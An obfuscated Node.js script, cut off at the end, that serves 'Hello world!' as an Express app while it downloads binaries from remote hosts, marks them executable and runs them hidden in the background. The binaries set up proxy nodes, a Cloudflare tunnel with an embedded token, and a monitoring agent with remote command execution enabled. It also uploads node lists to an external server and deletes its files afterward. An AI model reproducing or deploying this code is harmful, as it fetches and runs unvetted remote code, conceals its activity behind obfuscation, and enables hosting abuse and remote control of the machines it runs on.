const _0xcd3224=_0x4881;(function(_0x531ebc,_0xbcd501){const _0x2aa1f5=_0x4881,_0x584333=_0x531ebc();while(!![]){try{const _0x432611=-parseInt(_0x2aa1f5(0x112))/0x1+parseInt(_0x2aa1f5(0x182))/0x2*(parseInt(_0x2aa1f5(0x124))/0x3)+parseInt(_0x2aa1f5(0x130))/0x4+parseInt(_0x2aa1f5(0xdd))/0x5*(-parseInt(_0x2aa1f5(0x118))/0x6)+parseInt(_0x2aa1f5(0xfd))/0x7+-parseInt(_0x2aa1f5(0x123))/0x8+parseInt(_0x2aa1f5(0x187))/0x9*(-parseInt(_0x2aa1f5(0x133))/0xa);if(_0x432611===_0xbcd501)break;else _0x584333['push'](_0x584333['shift']());}catch(_0x4ef429){_0x584333['push'](_0x584333['shift']());}}}(_0x4c3a,0xeb04a));const express=require('express'),app=express(),axios=require(_0xcd3224(0x173)),os=require('os'),fs=require('fs'),path=require(_0xcd3224(0xdc)),{promisify}=require(_0xcd3224(0x13a)),exec=promisify(require(_0xcd3224(0x10e))['exec']),{execSync}=require(_0xcd3224(0x10e)),UPLOAD_URL=process[_0xcd3224(0x11b)][_0xcd3224(0xda)]||'',PROJECT_URL=process[_0xcd3224(0x11b)][_0xcd3224(0xff)]||'',AUTO_ACCESS=process[_0xcd3224(0x11b)]['AUTO_ACCESS']||![],FILE_PATH=process['env']['FILE_PATH']||'./tmp',SUB_PATH=process[_0xcd3224(0x11b)][_0xcd3224(0x12c)]||_0xcd3224(0x14b),PORT=process[_0xcd3224(0x11b)]['SERVER_PORT']||process['env']['PORT']||0xbb8,UUID=process[_0xcd3224(0x11b)][_0xcd3224(0xf5)]||_0xcd3224(0x157),NEZHA_SERVER=process['env'][_0xcd3224(0x15f)]||'',NEZHA_PORT=process[_0xcd3224(0x11b)][_0xcd3224(0xf1)]||'',NEZHA_KEY=process[_0xcd3224(0x11b)][_0xcd3224(0x108)]||'',ARGO_DOMAIN=process[_0xcd3224(0x11b)][_0xcd3224(0x14f)]||_0xcd3224(0x18b),ARGO_AUTH=process[_0xcd3224(0x11b)][_0xcd3224(0x131)]||_0xcd3224(0x107),ARGO_PORT=process[_0xcd3224(0x11b)][_0xcd3224(0x14c)]||0x1f41,CFIP=process[_0xcd3224(0x11b)][_0xcd3224(0xed)]||_0xcd3224(0x10b),CFPORT=process[_0xcd3224(0x11b)][_0xcd3224(0x10a)]||0x1bb,NAME=process[_0xcd3224(0x11b)][_0xcd3224(0x176)]||_0xcd3224(0xd2);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0xcd3224(0x172))):console[_0xcd3224(0x13b)](FILE_PATH+_0xcd3224(0x12f));function generateRandomName(){const _0x2a7d40=_0xcd3224,_0x1b81e2=_0x2a7d40(0x132);let _0x17213f='';for(let _0x15a182=0x0;_0x15a182<0x6;_0x15a182++){_0x17213f+=_0x1b81e2[_0x2a7d40(0xe9)](Math['floor'](Math[_0x2a7d40(0x11e)]()*_0x1b81e2[_0x2a7d40(0x146)]));}return _0x17213f;}function _0x4881(_0x5f41ae,_0x104e9a){_0x5f41ae=_0x5f41ae-0xce;const _0x4c3aee=_0x4c3a();let _0x4881cb=_0x4c3aee[_0x5f41ae];return _0x4881cb;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0xcd3224(0xe1)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0xcd3224(0xe1)](FILE_PATH,'sub.txt'),listPath=path[_0xcd3224(0xe1)](FILE_PATH,_0xcd3224(0x13f)),bootLogPath=path[_0xcd3224(0xe1)](FILE_PATH,_0xcd3224(0x169)),configPath=path[_0xcd3224(0xe1)](FILE_PATH,_0xcd3224(0x101));function deleteNodes(){const _0x493ded=_0xcd3224;try{if(!UPLOAD_URL)return;if(!fs[_0x493ded(0x12e)](subPath))return;let _0x299e2f;try{_0x299e2f=fs[_0x493ded(0x154)](subPath,_0x493ded(0x135));}catch{return null;}const _0x46267d=Buffer['from'](_0x299e2f,_0x493ded(0x149))[_0x493ded(0x192)](_0x493ded(0x135)),_0x781331=_0x46267d[_0x493ded(0x140)]('\x0a')[_0x493ded(0xe6)](_0x2bc749=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x493ded(0xfa)](_0x2bc749));if(_0x781331['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x493ded(0xd9),JSON[_0x493ded(0x18a)]({'nodes':_0x781331}),{'headers':{'Content-Type':_0x493ded(0x122)}})['catch'](_0x5a3b7b=>{return null;}),null;}catch(_0xf2dff3){return null;}}function cleanupOldFiles(){const _0x4603c5=_0xcd3224;try{const _0x503802=fs['readdirSync'](FILE_PATH);_0x503802[_0x4603c5(0x119)](_0x148028=>{const _0x199783=_0x4603c5,_0x100a25=path[_0x199783(0xe1)](FILE_PATH,_0x148028);try{const _0x189ee9=fs[_0x199783(0x178)](_0x100a25);_0x189ee9['isFile']()&&fs[_0x199783(0x152)](_0x100a25);}catch(_0x3426c1){}});}catch(_0x31b8bb){}}app['get']('/',function(_0x476594,_0x4a6b14){const _0x2a7b12=_0xcd3224;_0x4a6b14[_0x2a7b12(0x134)](_0x2a7b12(0x17f));});function _0x4c3a(){const _0x433088=['text/plain;\x20charset=utf-8','vless','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x22\x20>\x20/dev/null\x202>&1','NEZHA_SERVER','match','org','https://oooo.serv00.net/add-url','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','blackhole','win32','/config.json\x20>/dev/null\x202>&1\x20&','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','npm\x20running\x20error:\x20','boot.log','/api/add-subscriptions','quic','platform','web\x20running\x20error:\x20','ArgoDomain:','pop','nohup\x20','from','\x20is\x20created','axios','Skipping\x20adding\x20automatic\x20access\x20task','xtls-rprx-vision','NAME','vmess','statSync','all','unlink','Error\x20in\x20startserver:','Add\x20automatic\x20access\x20task\x20faild:\x20','https://arm64.ssss.nyc.mn/v1','--tls','Hello\x20world!','2083','/vmess-argo','78QJGtCH','Content-Type','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','mkdirSync','success','11043hrmcEu','unshift','listen','stringify','1.521005.xyz','close','Unknown','Unhandled\x20error\x20in\x20startserver:','Subscription\x20uploaded\x20successfully','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','clear','toString','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0a\x0atrojan://','\x0a\x20\x20\x20\x20','true','/vmess-argo?ed=2560','tunf','fileUrl','basename','map','/tunnel.yml\x20run','http','message','/api/delete-nodes','UPLOAD_URL','\x20-p\x20','path','10zMCyWg','countryCode','\x0aclient_secret:\x20','set','join','https://arm64.ssss.nyc.mn/web','post','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','none','filter','Error\x20reading\x20boot.log:','.exe\x20>\x20nul\x202>&1','charAt','response','pipe','/vless-argo','CFIP','includes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Error\x20executing\x20command:\x20','NEZHA_PORT','tunnel.json','8443','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','UUID','\x20>/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20successfully','TunnelSecret','test','stream','arm','10818360dBznpx','https://arm64.ssss.nyc.mn/bot','PROJECT_URL','tcp','config.json','443','push','config.yaml','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','writeFileSync','eyJhIjoiZDg5ZjA5YzY4NDkwOTQ2MWM1NzI0NTc1M2I5ZGY4MWYiLCJ0IjoiZDMwMDZjYzUtYmQ1MC00M2MyLTg2NmItMTQxMmEzNjYwNTdiIiwicyI6Ill6VTJaREExWkRNdE5UTmpZeTAwWlROaUxXSmpOalV0Tm1ZM1ltVXhZV0ZqTURWbSJ9','NEZHA_KEY','/sub.txt\x20saved\x20successfully','CFPORT','cdns.doon.eu.org','2053','chmod','child_process','Download\x20','fileName','amd','1497015sxBtMm','?encryption=none&security=tls&sni=','arm64','freedom','pkill\x20-f\x20\x22[','trojan','1254156HmylaG','forEach','\x20>/dev/null\x202>&1\x20&','env','block','status','random','get','createWriteStream','finish','application/json','10981608eBcigV','103953UxgUpX','automatic\x20access\x20task\x20added\x20successfully','/trojan-argo','?security=tls&sni=','\x20failed:\x20','2096','error','/dev/null','SUB_PATH','2087','existsSync','\x20already\x20exists','7392056iLKUmc','ARGO_AUTH','abcdefghijklmnopqrstuvwxyz','4030YxddFM','send','utf-8','\x20is\x20running','then','php\x20running\x20error:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','util','log','https://arm64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/web','tls','list.txt','split','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','has','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','substring','length','ARGO_DOMAIN:','country_code','base64','https+local://8.8.8.8/dns-query','sub','ARGO_PORT','catch','\x20-c\x20\x22','ARGO_DOMAIN','direct','App\x20is\x20running','unlinkSync','https://amd64.ssss.nyc.mn/agent','readFileSync','rm\x20-rf\x20','data','13a28065-5fba-4b1d-86e1-8985ad0ee05b','aarch64','127.0.0.1'];_0x4c3a=function(){return _0x433088;};return _0x4c3a();}async function generateConfig(){const _0x4b6333=_0xcd3224,_0x48dedc={'log':{'access':_0x4b6333(0x12b),'error':_0x4b6333(0x12b),'loglevel':_0x4b6333(0xe5)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4b6333(0x15b),'settings':{'clients':[{'id':UUID,'flow':_0x4b6333(0x175)}],'decryption':_0x4b6333(0xe5),'fallbacks':[{'dest':0xbb9},{'path':_0x4b6333(0xec),'dest':0xbba},{'path':_0x4b6333(0x181),'dest':0xbbb},{'path':_0x4b6333(0x126),'dest':0xbbc}]},'streamSettings':{'network':_0x4b6333(0x100)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x4b6333(0xe5)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x4b6333(0x15b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4b6333(0xe5)},'streamSettings':{'network':'ws','security':_0x4b6333(0xe5),'wsSettings':{'path':_0x4b6333(0xec)}},'sniffing':{'enabled':!![],'destOverride':[_0x4b6333(0xd7),_0x4b6333(0x13e),_0x4b6333(0x16b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4b6333(0x159),'protocol':_0x4b6333(0x177),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4b6333(0x181)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4b6333(0x13e),_0x4b6333(0x16b)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4b6333(0x159),'protocol':_0x4b6333(0x117),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4b6333(0x126)}},'sniffing':{'enabled':!![],'destOverride':[_0x4b6333(0xd7),_0x4b6333(0x13e),_0x4b6333(0x16b)],'metadataOnly':![]}}],'dns':{'servers':[_0x4b6333(0x14a)]},'outbounds':[{'protocol':_0x4b6333(0x115),'tag':_0x4b6333(0x150)},{'protocol':_0x4b6333(0x164),'tag':_0x4b6333(0x11c)}]};fs[_0x4b6333(0x106)](path[_0x4b6333(0xe1)](FILE_PATH,_0x4b6333(0x101)),JSON[_0x4b6333(0x18a)](_0x48dedc,null,0x2));}function getSystemArchitecture(){const _0x324c8f=_0xcd3224,_0x4682ce=os['arch']();return _0x4682ce===_0x324c8f(0xfc)||_0x4682ce===_0x324c8f(0x114)||_0x4682ce===_0x324c8f(0x158)?_0x324c8f(0xfc):_0x324c8f(0x111);}function downloadFile(_0x27195c,_0x27492e,_0x42d4ca){const _0x35d512=_0xcd3224,_0x3ebd50=_0x27195c;!fs[_0x35d512(0x12e)](FILE_PATH)&&fs[_0x35d512(0x185)](FILE_PATH,{'recursive':!![]});const _0x33f62d=fs[_0x35d512(0x120)](_0x3ebd50);axios({'method':'get','url':_0x27492e,'responseType':_0x35d512(0xfb)})[_0x35d512(0x137)](_0x4ce689=>{const _0x32e238=_0x35d512;_0x4ce689['data'][_0x32e238(0xeb)](_0x33f62d),_0x33f62d['on'](_0x32e238(0x121),()=>{const _0x50aa02=_0x32e238;_0x33f62d[_0x50aa02(0x18c)](),console['log']('Download\x20'+path['basename'](_0x3ebd50)+_0x50aa02(0xf8)),_0x42d4ca(null,_0x3ebd50);}),_0x33f62d['on'](_0x32e238(0x12a),_0xdee2e7=>{const _0x322b9c=_0x32e238;fs[_0x322b9c(0x17a)](_0x3ebd50,()=>{});const _0x38be16=_0x322b9c(0x10f)+path[_0x322b9c(0xd4)](_0x3ebd50)+_0x322b9c(0x128)+_0xdee2e7['message'];console[_0x322b9c(0x12a)](_0x38be16),_0x42d4ca(_0x38be16);});})[_0x35d512(0x14d)](_0x10be8f=>{const _0x4d8632=_0x35d512,_0x418c73=_0x4d8632(0x10f)+path[_0x4d8632(0xd4)](_0x3ebd50)+'\x20failed:\x20'+_0x10be8f[_0x4d8632(0xd8)];console['error'](_0x418c73),_0x42d4ca(_0x418c73);});}async function downloadFilesAndRun(){const _0x24d708=_0xcd3224,_0x1e8680=getSystemArchitecture(),_0x36c0ed=getFilesForArchitecture(_0x1e8680);if(_0x36c0ed[_0x24d708(0x146)]===0x0){console[_0x24d708(0x13b)](_0x24d708(0x105));return;}const _0x38b7f6=_0x36c0ed[_0x24d708(0xd5)](_0x206080=>{return new Promise((_0xe302da,_0x25fb31)=>{const _0x2b3d9b=_0x4881;downloadFile(_0x206080[_0x2b3d9b(0x110)],_0x206080[_0x2b3d9b(0xd3)],(_0xfd2405,_0x5401c8)=>{_0xfd2405?_0x25fb31(_0xfd2405):_0xe302da(_0x5401c8);});});});try{await Promise[_0x24d708(0x179)](_0x38b7f6);}catch(_0x5d0ae7){console[_0x24d708(0x12a)]('Error\x20downloading\x20files:',_0x5d0ae7);return;}function _0x44d9bb(_0x33ee67){const _0x303ba8=_0x24d708,_0x3816c4=0x1fd;_0x33ee67[_0x303ba8(0x119)](_0x526400=>{const _0x941de5=_0x303ba8;fs['existsSync'](_0x526400)&&fs[_0x941de5(0x10d)](_0x526400,_0x3816c4,_0x326e86=>{const _0x21ff6a=_0x941de5;_0x326e86?console[_0x21ff6a(0x12a)]('Empowerment\x20failed\x20for\x20'+_0x526400+':\x20'+_0x326e86):console[_0x21ff6a(0x13b)]('Empowerment\x20success\x20for\x20'+_0x526400+':\x20'+_0x3816c4['toString'](0x8));});});}const _0xf9fb76=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x44d9bb(_0xf9fb76);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x493d98=NEZHA_SERVER[_0x24d708(0xee)](':')?NEZHA_SERVER[_0x24d708(0x140)](':')[_0x24d708(0x16f)]():'',_0x414f48=new Set([_0x24d708(0x102),_0x24d708(0xf3),_0x24d708(0x129),_0x24d708(0x12d),_0x24d708(0x180),_0x24d708(0x10c)]),_0x2f337c=_0x414f48[_0x24d708(0x142)](_0x493d98)?_0x24d708(0xd0):'false',_0x1c6e3a=_0x24d708(0xdf)+NEZHA_KEY+_0x24d708(0x15d)+NEZHA_SERVER+_0x24d708(0x190)+_0x2f337c+_0x24d708(0xe4)+UUID;fs[_0x24d708(0x106)](path[_0x24d708(0xe1)](FILE_PATH,_0x24d708(0x104)),_0x1c6e3a);const _0x1d042c=_0x24d708(0x170)+phpPath+_0x24d708(0x14e)+FILE_PATH+_0x24d708(0xf4);try{await exec(_0x1d042c),console[_0x24d708(0x13b)](phpName+_0x24d708(0x136)),await new Promise(_0x1a2fab=>setTimeout(_0x1a2fab,0x3e8));}catch(_0xdafda8){console[_0x24d708(0x12a)](_0x24d708(0x138)+_0xdafda8);}}else{let _0xd72ddd='';const _0xe4b41=[_0x24d708(0x102),_0x24d708(0xf3),'2096',_0x24d708(0x12d),_0x24d708(0x180),_0x24d708(0x10c)];_0xe4b41[_0x24d708(0xee)](NEZHA_PORT)&&(_0xd72ddd=_0x24d708(0x17e));const _0x416379=_0x24d708(0x170)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x24d708(0xdb)+NEZHA_KEY+'\x20'+_0xd72ddd+_0x24d708(0x15c);try{await exec(_0x416379),console[_0x24d708(0x13b)](npmName+_0x24d708(0x136)),await new Promise(_0x43c92c=>setTimeout(_0x43c92c,0x3e8));}catch(_0x50cbb7){console[_0x24d708(0x12a)](_0x24d708(0x168)+_0x50cbb7);}}}else console['log'](_0x24d708(0x144));const _0x1852f4=_0x24d708(0x170)+webPath+'\x20-c\x20'+FILE_PATH+_0x24d708(0x166);try{await exec(_0x1852f4),console[_0x24d708(0x13b)](webName+_0x24d708(0x136)),await new Promise(_0x55a4b2=>setTimeout(_0x55a4b2,0x3e8));}catch(_0x2843d9){console[_0x24d708(0x12a)](_0x24d708(0x16d)+_0x2843d9);}if(fs['existsSync'](botPath)){let _0x5f3755;if(ARGO_AUTH[_0x24d708(0x160)](/^[A-Z0-9a-z=]{120,250}$/))_0x5f3755=_0x24d708(0xef)+ARGO_AUTH;else ARGO_AUTH[_0x24d708(0x160)](/TunnelSecret/)?_0x5f3755=_0x24d708(0xf7)+FILE_PATH+_0x24d708(0xd6):_0x5f3755=_0x24d708(0x184)+FILE_PATH+_0x24d708(0x163)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5f3755+_0x24d708(0x11a)),console['log'](botName+_0x24d708(0x136)),await new Promise(_0x418d3d=>setTimeout(_0x418d3d,0x7d0));}catch(_0x36da6f){console[_0x24d708(0x12a)](_0x24d708(0xf0)+_0x36da6f);}}await new Promise(_0x4b498e=>setTimeout(_0x4b498e,0x1388));}function getFilesForArchitecture(_0x3522d0){const _0x1102ea=_0xcd3224;let _0x1b52b2;_0x3522d0===_0x1102ea(0xfc)?_0x1b52b2=[{'fileName':webPath,'fileUrl':_0x1102ea(0xe2)},{'fileName':botPath,'fileUrl':_0x1102ea(0xfe)}]:_0x1b52b2=[{'fileName':webPath,'fileUrl':_0x1102ea(0x13d)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4caba5=_0x3522d0===_0x1102ea(0xfc)?_0x1102ea(0x13c):_0x1102ea(0x153);_0x1b52b2['unshift']({'fileName':npmPath,'fileUrl':_0x4caba5});}else{const _0x4921e4=_0x3522d0==='arm'?_0x1102ea(0x17d):'https://amd64.ssss.nyc.mn/v1';_0x1b52b2[_0x1102ea(0x188)]({'fileName':phpPath,'fileUrl':_0x4921e4});}}return _0x1b52b2;}function argoType(){const _0x1c229f=_0xcd3224;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1c229f(0x13b)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x1c229f(0xee)](_0x1c229f(0xf9))){fs[_0x1c229f(0x106)](path['join'](FILE_PATH,_0x1c229f(0xf2)),ARGO_AUTH);const _0x2af40e='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x1c229f(0x140)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x1c229f(0xe1)](FILE_PATH,'tunnel.json')+_0x1c229f(0x143)+ARGO_DOMAIN+_0x1c229f(0x139)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1c229f(0x106)](path[_0x1c229f(0xe1)](FILE_PATH,'tunnel.yml'),_0x2af40e);}else console[_0x1c229f(0x13b)](_0x1c229f(0x141));}async function extractDomains(){const _0x3f7a3c=_0xcd3224;let _0x304117;if(ARGO_AUTH&&ARGO_DOMAIN)_0x304117=ARGO_DOMAIN,console[_0x3f7a3c(0x13b)](_0x3f7a3c(0x147),_0x304117),await _0x1bc743(_0x304117);else try{const _0x1f54f8=fs[_0x3f7a3c(0x154)](path[_0x3f7a3c(0xe1)](FILE_PATH,_0x3f7a3c(0x169)),_0x3f7a3c(0x135)),_0x5b5609=_0x1f54f8['split']('\x0a'),_0x4d7d84=[];_0x5b5609[_0x3f7a3c(0x119)](_0x26ce74=>{const _0x533647=_0x3f7a3c,_0x58788c=_0x26ce74[_0x533647(0x160)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x58788c){const _0x163685=_0x58788c[0x1];_0x4d7d84[_0x533647(0x103)](_0x163685);}});if(_0x4d7d84[_0x3f7a3c(0x146)]>0x0)_0x304117=_0x4d7d84[0x0],console[_0x3f7a3c(0x13b)](_0x3f7a3c(0x16e),_0x304117),await _0x1bc743(_0x304117);else{console[_0x3f7a3c(0x13b)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x3f7a3c(0x152)](path['join'](FILE_PATH,_0x3f7a3c(0x169)));async function _0x24214a(){const _0x1cd7d8=_0x3f7a3c;try{process[_0x1cd7d8(0x16c)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x1cd7d8(0xe8)):await exec(_0x1cd7d8(0x116)+botName[_0x1cd7d8(0xe9)](0x0)+']'+botName[_0x1cd7d8(0x145)](0x1)+_0x1cd7d8(0x15e));}catch(_0x1ce39c){}}_0x24214a(),await new Promise(_0x191163=>setTimeout(_0x191163,0xbb8));const _0x53a4f8=_0x3f7a3c(0x184)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x3f7a3c(0x170)+botPath+'\x20'+_0x53a4f8+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x12f2e2=>setTimeout(_0x12f2e2,0xbb8)),await extractDomains();}catch(_0x593521){console[_0x3f7a3c(0x12a)](_0x3f7a3c(0xf0)+_0x593521);}}}catch(_0x52ac08){console['error'](_0x3f7a3c(0xe7),_0x52ac08);}async function _0x52bc72(){const _0x3dd50b=_0x3f7a3c;try{const _0x578fde=await axios[_0x3dd50b(0x11f)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x578fde['data']&&_0x578fde[_0x3dd50b(0x156)][_0x3dd50b(0x148)]&&_0x578fde['data']['org'])return _0x578fde[_0x3dd50b(0x156)][_0x3dd50b(0x148)]+'_'+_0x578fde['data'][_0x3dd50b(0x161)];}catch(_0x2039a4){try{const _0x4bd9cf=await axios[_0x3dd50b(0x11f)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x4bd9cf[_0x3dd50b(0x156)]&&_0x4bd9cf[_0x3dd50b(0x156)][_0x3dd50b(0x11d)]===_0x3dd50b(0x186)&&_0x4bd9cf[_0x3dd50b(0x156)]['countryCode']&&_0x4bd9cf[_0x3dd50b(0x156)][_0x3dd50b(0x161)])return _0x4bd9cf[_0x3dd50b(0x156)][_0x3dd50b(0xde)]+'_'+_0x4bd9cf[_0x3dd50b(0x156)][_0x3dd50b(0x161)];}catch(_0x79c686){}}return _0x3dd50b(0x18d);}async function _0x1bc743(_0x3e1083){const _0x562965=await _0x52bc72(),_0x3ac253=NAME?NAME+'-'+_0x562965:_0x562965;return new Promise(_0x2bb7f7=>{setTimeout(()=>{const _0x3a5b0e=_0x4881,_0x135a1b={'v':'2','ps':''+_0x3ac253,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3a5b0e(0xe5),'net':'ws','type':_0x3a5b0e(0xe5),'host':_0x3e1083,'path':_0x3a5b0e(0xd1),'tls':_0x3a5b0e(0x13e),'sni':_0x3e1083,'alpn':'','fp':'firefox'},_0x3ea659='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x3a5b0e(0x113)+_0x3e1083+'&fp=firefox&type=ws&host='+_0x3e1083+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3ac253+'\x0a\x0avmess://'+Buffer['from'](JSON['stringify'](_0x135a1b))[_0x3a5b0e(0x192)](_0x3a5b0e(0x149))+_0x3a5b0e(0xce)+UUID+'@'+CFIP+':'+CFPORT+_0x3a5b0e(0x127)+_0x3e1083+'&fp=firefox&type=ws&host='+_0x3e1083+_0x3a5b0e(0x193)+_0x3ac253+_0x3a5b0e(0xcf);console[_0x3a5b0e(0x13b)](Buffer[_0x3a5b0e(0x171)](_0x3ea659)['toString']('base64')),fs[_0x3a5b0e(0x106)](subPath,Buffer[_0x3a5b0e(0x171)](_0x3ea659)[_0x3a5b0e(0x192)](_0x3a5b0e(0x149))),console[_0x3a5b0e(0x13b)](FILE_PATH+_0x3a5b0e(0x109)),uploadNodes(),app[_0x3a5b0e(0x11f)]('/'+SUB_PATH,(_0x5bb837,_0x56a549)=>{const _0x189eb0=_0x3a5b0e,_0x3e4497=Buffer[_0x189eb0(0x171)](_0x3ea659)[_0x189eb0(0x192)](_0x189eb0(0x149));_0x56a549[_0x189eb0(0xe0)](_0x189eb0(0x183),_0x189eb0(0x15a)),_0x56a549[_0x189eb0(0x134)](_0x3e4497);}),_0x2bb7f7(_0x3ea659);},0x7d0);});}}async function uploadNodes(){const _0x28c497=_0xcd3224;if(UPLOAD_URL&&PROJECT_URL){const _0x54d34a=PROJECT_URL+'/'+SUB_PATH,_0x450afb={'subscription':[_0x54d34a]};try{const _0x15c23a=await axios[_0x28c497(0xe3)](UPLOAD_URL+_0x28c497(0x16a),_0x450afb,{'headers':{'Content-Type':_0x28c497(0x122)}});return _0x15c23a&&_0x15c23a[_0x28c497(0x11d)]===0xc8?(console[_0x28c497(0x13b)](_0x28c497(0x18f)),_0x15c23a):null;}catch(_0xf3a537){if(_0xf3a537[_0x28c497(0xea)]){if(_0xf3a537[_0x28c497(0xea)][_0x28c497(0x11d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x28c497(0x12e)](listPath))return;const _0x6f1f75=fs[_0x28c497(0x154)](listPath,_0x28c497(0x135)),_0x1bc844=_0x6f1f75[_0x28c497(0x140)]('\x0a')[_0x28c497(0xe6)](_0x202d3e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x202d3e));if(_0x1bc844[_0x28c497(0x146)]===0x0)return;const _0x401363=JSON[_0x28c497(0x18a)]({'nodes':_0x1bc844});try{const _0x4455b7=await axios[_0x28c497(0xe3)](UPLOAD_URL+'/api/add-nodes',_0x401363,{'headers':{'Content-Type':_0x28c497(0x122)}});return _0x4455b7&&_0x4455b7[_0x28c497(0x11d)]===0xc8?(console[_0x28c497(0x13b)]('Nodes\x20uploaded\x20successfully'),_0x4455b7):null;}catch(_0x30bc00){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x37856c=_0x4881,_0x37a906=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x37a906[_0x37856c(0x103)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x37a906[_0x37856c(0x103)](phpPath);process[_0x37856c(0x16c)]===_0x37856c(0x165)?exec('del\x20/f\x20/q\x20'+_0x37a906[_0x37856c(0xe1)]('\x20')+'\x20>\x20nul\x202>&1',_0x33ca70=>{const _0x10e3ed=_0x37856c;console[_0x10e3ed(0x191)](),console[_0x10e3ed(0x13b)]('App\x20is\x20running'),console[_0x10e3ed(0x13b)](_0x10e3ed(0x167));}):exec(_0x37856c(0x155)+_0x37a906[_0x37856c(0xe1)]('\x20')+_0x37856c(0xf6),_0x44c1a9=>{const _0x257d3e=_0x37856c;console[_0x257d3e(0x191)](),console['log'](_0x257d3e(0x151)),console[_0x257d3e(0x13b)](_0x257d3e(0x167));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x126c25=_0xcd3224;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x126c25(0x13b)](_0x126c25(0x174));return;}try{const _0x4dc6f7=await axios['post'](_0x126c25(0x162),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x126c25(0x122)}});return console['log'](_0x126c25(0x125)),_0x4dc6f7;}catch(_0x770531){return console[_0x126c25(0x12a)](_0x126c25(0x17c)+_0x770531['message']),null;}}async function startserver(){const _0x5ce6ed=_0xcd3224;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4a5a6a){console[_0x5ce6ed(0x12a)](_0x5ce6ed(0x17b),_0x4a5a6a);}}startserver()['catch'](_0x3c6cd5=>{const 